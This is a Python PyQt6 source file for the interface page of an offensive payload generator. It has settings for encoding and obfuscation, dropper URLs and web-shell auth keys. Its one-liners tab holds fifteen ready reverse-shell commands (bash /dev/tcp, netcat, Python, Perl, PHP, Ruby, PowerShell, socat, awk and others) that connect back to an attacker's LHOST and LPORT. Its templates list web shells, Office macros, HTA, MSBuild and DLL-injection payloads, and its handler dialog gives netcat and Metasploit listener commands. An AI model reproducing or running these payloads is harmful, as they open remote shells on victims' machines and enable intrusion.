"""
Payload Generator Page
Advanced multi-platform payload generation interface
"""

import asyncio
import os
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QTableWidget, QTableWidgetItem, QTabWidget, QComboBox,
    QSpinBox, QGroupBox, QTextEdit, QLineEdit, QProgressBar,
    QSplitter, QFrame, QHeaderView, QCheckBox, QMessageBox,
    QFileDialog, QListWidget, QListWidgetItem, QFormLayout,
    QScrollArea, QPlainTextEdit
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QThread
from PyQt6.QtGui import QColor, QFont, QSyntaxHighlighter, QTextCharFormat

import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from core.payload_generator import (
    PayloadGenerator, PayloadConfig, PayloadType, Platform,
    Architecture, OutputFormat, EncoderType
)


class PayloadWorker(QThread):
    """Background worker for payload generation"""
    result_ready = pyqtSignal(object)
    progress = pyqtSignal(str)
    error = pyqtSignal(str)
    
    def __init__(self, generator, config):
        super().__init__()
        self.generator = generator
        self.config = config
    
    def run(self):
        try:
            result = self.generator.generate(self.config)
            self.result_ready.emit(result)
        except Exception as e:
            self.error.emit(str(e))


class CodeHighlighter(QSyntaxHighlighter):
    """Simple syntax highlighter for payload code"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlighting_rules = []
        
        # Keywords
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor("#ff6b00"))
        keywords = [
            'import', 'from', 'def', 'class', 'return', 'if', 'else', 'elif',
            'for', 'while', 'try', 'except', 'with', 'as', 'in', 'not', 'and', 'or',
            'True', 'False', 'None', 'lambda', 'yield', 'async', 'await'
        ]
        for word in keywords:
            self.highlighting_rules.append((f'\\b{word}\\b', keyword_format))
        
        # Strings
        string_format = QTextCharFormat()
        string_format.setForeground(QColor("#00ff88"))
        self.highlighting_rules.append((r'"[^"]*"', string_format))
        self.highlighting_rules.append((r"'[^']*'", string_format))
        
        # Comments
        comment_format = QTextCharFormat()
        comment_format.setForeground(QColor("#666666"))
        self.highlighting_rules.append((r'#.*', comment_format))
        
        # Numbers
        number_format = QTextCharFormat()
        number_format.setForeground(QColor("#00d4ff"))
        self.highlighting_rules.append((r'\b\d+\b', number_format))
    
    def highlightBlock(self, text):
        import re
        for pattern, fmt in self.highlighting_rules:
            for match in re.finditer(pattern, text):
                self.setFormat(match.start(), match.end() - match.start(), fmt)


class PayloadGeneratorPage(QWidget):
    """Payload Generator GUI Page"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.generator = PayloadGenerator()
        self.current_payload = None
        self.workers = []
        
        self.setup_ui()
    
    def setup_ui(self):
        """Setup the user interface"""
        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        
        # Header
        header = QLabel("💣 Payload Generator")
        header.setStyleSheet("""
            font-size: 24px;
            font-weight: bold;
            color: #ff6b00;
            padding: 10px;
        """)
        layout.addWidget(header)
        
        # Main splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Left side - Configuration
        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        
        # Payload Type
        type_group = QGroupBox("Payload Configuration")
        type_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #ff6b00;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
                color: #ff6b00;
            }
        """)
        type_layout = QFormLayout(type_group)
        
        # Payload type
        self.payload_type = QComboBox()
        for pt in PayloadType:
            self.payload_type.addItem(pt.value.replace('_', ' ').title(), pt)
        self.payload_type.currentIndexChanged.connect(self.on_type_changed)
        type_layout.addRow("Payload Type:", self.payload_type)
        
        # Platform
        self.platform = QComboBox()
        for p in Platform:
            self.platform.addItem(p.value.title(), p)
        self.platform.currentIndexChanged.connect(self.update_formats)
        type_layout.addRow("Platform:", self.platform)
        
        # Architecture
        self.architecture = QComboBox()
        for a in Architecture:
            self.architecture.addItem(a.value.upper(), a)
        type_layout.addRow("Architecture:", self.architecture)
        
        # Output Format
        self.output_format = QComboBox()
        self.update_formats()
        type_layout.addRow("Output Format:", self.output_format)
        
        left_layout.addWidget(type_group)
        
        # Connection Settings
        conn_group = QGroupBox("Connection Settings")
        conn_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #00d4ff;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
                color: #00d4ff;
            }
        """)
        conn_layout = QFormLayout(conn_group)
        
        self.lhost = QLineEdit()
        self.lhost.setPlaceholderText("Your IP address")
        conn_layout.addRow("LHOST:", self.lhost)
        
        self.lport = QSpinBox()
        self.lport.setRange(1, 65535)
        self.lport.setValue(4444)
        conn_layout.addRow("LPORT:", self.lport)
        
        self.rhost = QLineEdit()
        self.rhost.setPlaceholderText("Target IP (for bind shells)")
        conn_layout.addRow("RHOST:", self.rhost)
        
        self.rport = QSpinBox()
        self.rport.setRange(0, 65535)
        self.rport.setValue(0)
        conn_layout.addRow("RPORT:", self.rport)
        
        left_layout.addWidget(conn_group)
        
        # Encoding Settings
        enc_group = QGroupBox("Encoding & Obfuscation")
        enc_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #00ff88;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
                color: #00ff88;
            }
        """)
        enc_layout = QFormLayout(enc_group)
        
        self.encoder = QComboBox()
        for e in EncoderType:
            self.encoder.addItem(e.value.replace('_', ' ').title(), e)
        enc_layout.addRow("Encoder:", self.encoder)
        
        self.iterations = QSpinBox()
        self.iterations.setRange(1, 10)
        self.iterations.setValue(1)
        enc_layout.addRow("Iterations:", self.iterations)
        
        self.bad_chars = QLineEdit()
        self.bad_chars.setPlaceholderText("\\x00\\x0a\\x0d")
        self.bad_chars.setText("\\x00\\x0a\\x0d")
        enc_layout.addRow("Bad Chars:", self.bad_chars)
        
        nop_layout = QHBoxLayout()
        self.prepend_nops = QSpinBox()
        self.prepend_nops.setRange(0, 1000)
        nop_layout.addWidget(QLabel("Prepend:"))
        nop_layout.addWidget(self.prepend_nops)
        self.append_nops = QSpinBox()
        self.append_nops.setRange(0, 1000)
        nop_layout.addWidget(QLabel("Append:"))
        nop_layout.addWidget(self.append_nops)
        enc_layout.addRow("NOPs:", nop_layout)
        
        left_layout.addWidget(enc_group)
        
        # Custom Options
        custom_group = QGroupBox("Custom Options")
        custom_layout = QFormLayout(custom_group)
        
        self.custom_url = QLineEdit()
        self.custom_url.setPlaceholderText("URL for dropper payloads")
        custom_layout.addRow("URL:", self.custom_url)
        
        self.custom_filename = QLineEdit()
        self.custom_filename.setPlaceholderText("Filename for downloads")
        custom_layout.addRow("Filename:", self.custom_filename)
        
        self.auth_key = QLineEdit()
        self.auth_key.setPlaceholderText("Auth key for web shells")
        custom_layout.addRow("Auth Key:", self.auth_key)
        
        left_layout.addWidget(custom_group)
        
        # Generate Button
        self.generate_btn = QPushButton("⚡ Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background: linear-gradient(135deg, #ff6b00, #ff4444);
                color: white;
                font-size: 16px;
                font-weight: bold;
                padding: 15px;
                border-radius: 8px;
                border: none;
            }
            QPushButton:hover {
                background: linear-gradient(135deg, #ff8533, #ff6666);
            }
        """)
        left_layout.addWidget(self.generate_btn)
        
        left_layout.addStretch()
        splitter.addWidget(left_widget)
        
        # Right side - Output
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        
        # Output tabs
        output_tabs = QTabWidget()
        output_tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid #333;
                border-radius: 8px;
            }
            QTabBar::tab {
                background: #1a1a2e;
                color: #888;
                padding: 10px 20px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #ff6b00;
                color: #fff;
            }
        """)
        
        # Code Preview Tab
        code_tab = QWidget()
        code_layout = QVBoxLayout(code_tab)
        
        self.code_preview = QPlainTextEdit()
        self.code_preview.setReadOnly(True)
        self.code_preview.setFont(QFont("Consolas", 10))
        self.code_preview.setStyleSheet("""
            QPlainTextEdit {
                background: #0d0d1a;
                color: #00ff88;
                border: 1px solid #333;
                border-radius: 4px;
            }
        """)
        self.highlighter = CodeHighlighter(self.code_preview.document())
        code_layout.addWidget(self.code_preview)
        
        code_buttons = QHBoxLayout()
        copy_code_btn = QPushButton("📋 Copy Code")
        copy_code_btn.clicked.connect(self.copy_code)
        code_buttons.addWidget(copy_code_btn)
        
        save_code_btn = QPushButton("💾 Save Code")
        save_code_btn.clicked.connect(self.save_code)
        code_buttons.addWidget(save_code_btn)
        code_buttons.addStretch()
        code_layout.addLayout(code_buttons)
        
        output_tabs.addTab(code_tab, "📝 Code")
        
        # Hex View Tab
        hex_tab = QWidget()
        hex_layout = QVBoxLayout(hex_tab)
        
        self.hex_view = QPlainTextEdit()
        self.hex_view.setReadOnly(True)
        self.hex_view.setFont(QFont("Consolas", 10))
        self.hex_view.setStyleSheet("""
            QPlainTextEdit {
                background: #0d0d1a;
                color: #00d4ff;
                border: 1px solid #333;
            }
        """)
        hex_layout.addWidget(self.hex_view)
        
        hex_buttons = QHBoxLayout()
        copy_hex_btn = QPushButton("📋 Copy Hex")
        copy_hex_btn.clicked.connect(self.copy_hex)
        hex_buttons.addWidget(copy_hex_btn)
        
        copy_c_btn = QPushButton("📋 Copy as C Array")
        copy_c_btn.clicked.connect(self.copy_c_array)
        hex_buttons.addWidget(copy_c_btn)
        
        copy_py_btn = QPushButton("📋 Copy as Python")
        copy_py_btn.clicked.connect(self.copy_python_bytes)
        hex_buttons.addWidget(copy_py_btn)
        hex_buttons.addStretch()
        hex_layout.addLayout(hex_buttons)
        
        output_tabs.addTab(hex_tab, "🔢 Hex")
        
        # One-Liners Tab
        oneliners_tab = QWidget()
        oneliners_layout = QVBoxLayout(oneliners_tab)
        
        self.oneliners_list = QListWidget()
        self.oneliners_list.setStyleSheet("""
            QListWidget {
                background: #0d0d1a;
                border: 1px solid #333;
            }
            QListWidget::item {
                padding: 10px;
                border-bottom: 1px solid #333;
            }
            QListWidget::item:selected {
                background: #ff6b00;
            }
        """)
        oneliners_layout.addWidget(self.oneliners_list)
        
        copy_oneliner_btn = QPushButton("📋 Copy Selected")
        copy_oneliner_btn.clicked.connect(self.copy_oneliner)
        oneliners_layout.addWidget(copy_oneliner_btn)
        
        output_tabs.addTab(oneliners_tab, "⚡ One-Liners")
        
        # Templates Tab
        templates_tab = self.create_templates_tab()
        output_tabs.addTab(templates_tab, "📚 Templates")
        
        right_layout.addWidget(output_tabs)
        
        # Payload Info
        info_group = QGroupBox("Payload Information")
        info_layout = QFormLayout(info_group)
        
        self.payload_size = QLabel("0 bytes")
        info_layout.addRow("Size:", self.payload_size)
        
        self.payload_md5 = QLabel("-")
        info_layout.addRow("MD5:", self.payload_md5)
        
        self.payload_sha256 = QLabel("-")
        info_layout.addRow("SHA256:", self.payload_sha256)
        
        right_layout.addWidget(info_group)
        
        # Save Options
        save_layout = QHBoxLayout()
        
        self.save_btn = QPushButton("💾 Save Payload")
        self.save_btn.clicked.connect(self.save_payload)
        self.save_btn.setEnabled(False)
        self.save_btn.setStyleSheet("""
            QPushButton {
                background: #00ff88;
                color: #000;
                font-weight: bold;
                padding: 10px 20px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background: #00cc6a;
            }
            QPushButton:disabled {
                background: #333;
                color: #666;
            }
        """)
        save_layout.addWidget(self.save_btn)
        
        self.handler_btn = QPushButton("🎧 Start Handler")
        self.handler_btn.clicked.connect(self.start_handler)
        save_layout.addWidget(self.handler_btn)
        
        save_layout.addStretch()
        right_layout.addLayout(save_layout)
        
        splitter.addWidget(right_widget)
        splitter.setSizes([400, 600])
        
        layout.addWidget(splitter)
        
        # Status bar
        self.status_bar = QLabel("Ready to generate payloads")
        self.status_bar.setStyleSheet("""
            background: #1a1a2e;
            padding: 8px;
            border-radius: 4px;
            color: #00ff88;
        """)
        layout.addWidget(self.status_bar)
        
        # Populate one-liners
        self.populate_oneliners()
    
    def create_templates_tab(self):
        """Create templates browser tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Category filter
        filter_layout = QHBoxLayout()
        filter_layout.addWidget(QLabel("Category:"))
        self.template_filter = QComboBox()
        self.template_filter.addItems([
            "All", "Reverse Shells", "Bind Shells", "Web Shells",
            "File Transfer", "Persistence", "Privilege Escalation"
        ])
        self.template_filter.currentTextChanged.connect(self.filter_templates)
        filter_layout.addWidget(self.template_filter)
        filter_layout.addStretch()
        layout.addLayout(filter_layout)
        
        # Templates list
        self.templates_list = QTableWidget()
        self.templates_list.setColumnCount(4)
        self.templates_list.setHorizontalHeaderLabels([
            "Name", "Platform", "Language", "Description"
        ])
        self.templates_list.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.templates_list.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.templates_list.doubleClicked.connect(self.use_template)
        layout.addWidget(self.templates_list)
        
        # Populate templates
        self.populate_templates()
        
        template_buttons = QHBoxLayout()
        use_btn = QPushButton("Use Template")
        use_btn.clicked.connect(self.use_template)
        template_buttons.addWidget(use_btn)
        
        preview_btn = QPushButton("Preview")
        preview_btn.clicked.connect(self.preview_template)
        template_buttons.addWidget(preview_btn)
        template_buttons.addStretch()
        layout.addLayout(template_buttons)
        
        return widget
    
    def populate_oneliners(self):
        """Populate one-liners list"""
        oneliners = [
            ("Bash Reverse Shell", "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"),
            ("Bash Alt", "/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"),
            ("Netcat -e", "nc -e /bin/sh {LHOST} {LPORT}"),
            ("Netcat FIFO", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"),
            ("Python", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            ("Python3", "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"),
            ("Perl", "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
            ("PHP", "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            ("Ruby", "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
            ("PowerShell", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}\""),
            ("PowerShell Base64", "powershell -enc {BASE64}"),
            ("Java", "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()"),
            ("Lua", "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""),
            ("Socat", "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}"),
            ("AWK", "awk 'BEGIN {{s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'"),
        ]
        
        for name, cmd in oneliners:
            item = QListWidgetItem(f"[{name}]\n{cmd}")
            item.setData(Qt.ItemDataRole.UserRole, cmd)
            self.oneliners_list.addItem(item)
    
    def populate_templates(self):
        """Populate templates table"""
        templates = [
            ("Python Reverse Shell", "Linux/Windows", "Python", "Full-featured reverse shell"),
            ("PowerShell Reverse", "Windows", "PowerShell", "Windows reverse shell"),
            ("PHP Web Shell", "Web", "PHP", "Simple web shell with command exec"),
            ("PHP Advanced Shell", "Web", "PHP", "Encrypted web shell with auth"),
            ("ASPX Web Shell", "Windows/IIS", "C#", "IIS web shell"),
            ("JSP Web Shell", "Java/Tomcat", "Java", "Tomcat web shell"),
            ("Bash Reverse", "Linux", "Bash", "Simple bash reverse shell"),
            ("C Reverse Shell", "Linux", "C", "Compiled reverse shell"),
            ("C# Reverse Shell", "Windows", "C#", "Windows C# reverse shell"),
            ("VBA Macro", "Windows/Office", "VBA", "Office macro payload"),
            ("HTA Application", "Windows", "VBScript", "HTML Application payload"),
            ("BAT Reverse", "Windows", "Batch", "Batch file reverse shell"),
            ("MSBuild Payload", "Windows", "XML", "MSBuild inline task payload"),
            ("DLL Injection", "Windows", "C", "DLL injection payload"),
            ("Shellcode Runner", "Windows/Linux", "Python", "Generic shellcode executor"),
        ]
        
        self.templates_list.setRowCount(len(templates))
        for row, (name, platform, lang, desc) in enumerate(templates):
            self.templates_list.setItem(row, 0, QTableWidgetItem(name))
            self.templates_list.setItem(row, 1, QTableWidgetItem(platform))
            self.templates_list.setItem(row, 2, QTableWidgetItem(lang))
            self.templates_list.setItem(row, 3, QTableWidgetItem(desc))
    
    def filter_templates(self, category):
        """Filter templates by category"""
        # Simplified - just show all for now
        pass
    
    def use_template(self):
        """Use selected template"""
        row = self.templates_list.currentRow()
        if row >= 0:
            name = self.templates_list.item(row, 0).text()
            self.status_bar.setText(f"Template '{name}' selected")
            # Set appropriate payload type based on template
            # This would map templates to payload configs
    
    def preview_template(self):
        """Preview selected template"""
        row = self.templates_list.currentRow()
        if row >= 0:
            # Show preview dialog
            pass
    
    def on_type_changed(self):
        """Handle payload type change"""
        self.update_formats()
    
    def update_formats(self):
        """Update available output formats based on platform"""
        platform = self.platform.currentData()
        payload_type = self.payload_type.currentData()
        
        self.output_format.clear()
        
        if payload_type == PayloadType.WEB_SHELL:
            formats = [OutputFormat.PHP, OutputFormat.ASPX, OutputFormat.JSP]
        elif platform == Platform.WINDOWS:
            formats = [
                OutputFormat.PS1, OutputFormat.BAT, OutputFormat.EXE,
                OutputFormat.DLL, OutputFormat.VBA, OutputFormat.HTA,
                OutputFormat.CSHARP, OutputFormat.PYTHON
            ]
        elif platform == Platform.LINUX:
            formats = [
                OutputFormat.PYTHON, OutputFormat.ELF, OutputFormat.PERL,
                OutputFormat.RUBY, OutputFormat.C, OutputFormat.RAW
            ]
        elif platform == Platform.MACOS:
            formats = [
                OutputFormat.PYTHON, OutputFormat.MACHO, OutputFormat.RUBY,
                OutputFormat.PERL
            ]
        elif platform == Platform.WEB:
            formats = [
                OutputFormat.PHP, OutputFormat.ASPX, OutputFormat.JSP,
                OutputFormat.WAR
            ]
        else:
            formats = [f for f in OutputFormat]
        
        for fmt in formats:
            self.output_format.addItem(fmt.value.upper(), fmt)
    
    def generate_payload(self):
        """Generate the payload"""
        # Build configuration
        config = PayloadConfig(
            payload_type=self.payload_type.currentData(),
            platform=self.platform.currentData(),
            architecture=self.architecture.currentData(),
            lhost=self.lhost.text() or "0.0.0.0",
            lport=self.lport.value(),
            rhost=self.rhost.text(),
            rport=self.rport.value(),
            output_format=self.output_format.currentData(),
            encoder=self.encoder.currentData(),
            encoder_iterations=self.iterations.value(),
            prepend_nops=self.prepend_nops.value(),
            append_nops=self.append_nops.value(),
            custom_options={
                'url': self.custom_url.text(),
                'filename': self.custom_filename.text(),
                'auth_key': self.auth_key.text(),
                'advanced': bool(self.auth_key.text())
            }
        )
        
        # Parse bad chars
        bad_chars_text = self.bad_chars.text()
        if bad_chars_text:
            try:
                config.bad_chars = bytes(bad_chars_text, 'utf-8').decode('unicode_escape').encode('latin-1')
            except:
                config.bad_chars = b"\x00\x0a\x0d"
        
        self.status_bar.setText("Generating payload...")
        self.generate_btn.setEnabled(False)
        
        worker = PayloadWorker(self.generator, config)
        worker.result_ready.connect(self.on_payload_generated)
        worker.error.connect(self.on_error)
        worker.start()
        self.workers.append(worker)
    
    def on_payload_generated(self, payload):
        """Handle generated payload"""
        self.current_payload = payload
        self.generate_btn.setEnabled(True)
        self.save_btn.setEnabled(True)
        
        # Update code preview
        try:
            code = payload.encoded_payload.decode('utf-8', errors='replace')
            self.code_preview.setPlainText(code)
        except:
            self.code_preview.setPlainText("Binary payload - see Hex view")
        
        # Update hex view
        hex_lines = []
        for i in range(0, len(payload.encoded_payload), 16):
            chunk = payload.encoded_payload[i:i+16]
            hex_part = ' '.join(f'{b:02x}' for b in chunk)
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
            hex_lines.append(f'{i:08x}  {hex_part:<48}  {ascii_part}')
        self.hex_view.setPlainText('\n'.join(hex_lines))
        
        # Update info
        self.payload_size.setText(f"{payload.size} bytes")
        self.payload_md5.setText(payload.md5)
        self.payload_sha256.setText(payload.sha256[:32] + "...")
        
        self.status_bar.setText(f"✅ Payload generated: {payload.size} bytes")
    
    def on_error(self, error):
        """Handle errors"""
        self.generate_btn.setEnabled(True)
        self.status_bar.setText(f"❌ Error: {error}")
        QMessageBox.critical(self, "Error", error)
    
    def copy_code(self):
        """Copy code to clipboard"""
        from PyQt6.QtWidgets import QApplication
        QApplication.clipboard().setText(self.code_preview.toPlainText())
        self.status_bar.setText("Code copied to clipboard")
    
    def copy_hex(self):
        """Copy hex to clipboard"""
        if self.current_payload:
            from PyQt6.QtWidgets import QApplication
            hex_str = self.current_payload.encoded_payload.hex()
            QApplication.clipboard().setText(hex_str)
            self.status_bar.setText("Hex copied to clipboard")
    
    def copy_c_array(self):
        """Copy as C array"""
        if self.current_payload:
            from PyQt6.QtWidgets import QApplication
            hex_items = [f'0x{b:02x}' for b in self.current_payload.encoded_payload]
            c_array = f"unsigned char shellcode[] = {{\n    {', '.join(hex_items)}\n}};"
            QApplication.clipboard().setText(c_array)
            self.status_bar.setText("C array copied to clipboard")
    
    def copy_python_bytes(self):
        """Copy as Python bytes"""
        if self.current_payload:
            from PyQt6.QtWidgets import QApplication
            hex_str = ''.join(f'\\x{b:02x}' for b in self.current_payload.encoded_payload)
            py_bytes = f'shellcode = b"{hex_str}"'
            QApplication.clipboard().setText(py_bytes)
            self.status_bar.setText("Python bytes copied to clipboard")
    
    def copy_oneliner(self):
        """Copy selected one-liner"""
        item = self.oneliners_list.currentItem()
        if item:
            from PyQt6.QtWidgets import QApplication
            cmd = item.data(Qt.ItemDataRole.UserRole)
            # Replace placeholders
            cmd = cmd.replace("{LHOST}", self.lhost.text() or "0.0.0.0")
            cmd = cmd.replace("{LPORT}", str(self.lport.value()))
            QApplication.clipboard().setText(cmd)
            self.status_bar.setText("One-liner copied to clipboard")
    
    def save_code(self):
        """Save code to file"""
        if not self.current_payload:
            return
        
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Save Code", "",
            "All Files (*.*)"
        )
        if filepath:
            with open(filepath, 'wb') as f:
                f.write(self.current_payload.encoded_payload)
            self.status_bar.setText(f"Code saved to {filepath}")
    
    def save_payload(self):
        """Save payload to file"""
        if not self.current_payload:
            return
        
        # Suggest extension based on format
        fmt = self.current_payload.config.output_format
        extensions = {
            OutputFormat.EXE: "exe",
            OutputFormat.DLL: "dll",
            OutputFormat.ELF: "elf",
            OutputFormat.PS1: "ps1",
            OutputFormat.BAT: "bat",
            OutputFormat.PHP: "php",
            OutputFormat.PYTHON: "py",
            OutputFormat.VBA: "vba",
            OutputFormat.HTA: "hta",
        }
        ext = extensions.get(fmt, "bin")
        
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Save Payload", f"payload.{ext}",
            "All Files (*.*)"
        )
        if filepath:
            self.current_payload.save(filepath)
            self.status_bar.setText(f"Payload saved to {filepath}")
    
    def start_handler(self):
        """Start listener handler"""
        if not self.lhost.text() or not self.lport.value():
            QMessageBox.warning(self, "Error", "Set LHOST and LPORT first")
            return
        
        # Open handler command suggestion
        port = self.lport.value()
        commands = [
            f"nc -lvnp {port}",
            f"ncat -lvnp {port}",
            f"socat file:`tty`,raw,echo=0 tcp-listen:{port}",
            f"msfconsole -q -x 'use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {port}; exploit'",
        ]
        
        msg = "Start a listener with one of these commands:\n\n"
        msg += "\n".join(commands)
        
        QMessageBox.information(self, "Handler Commands", msg)
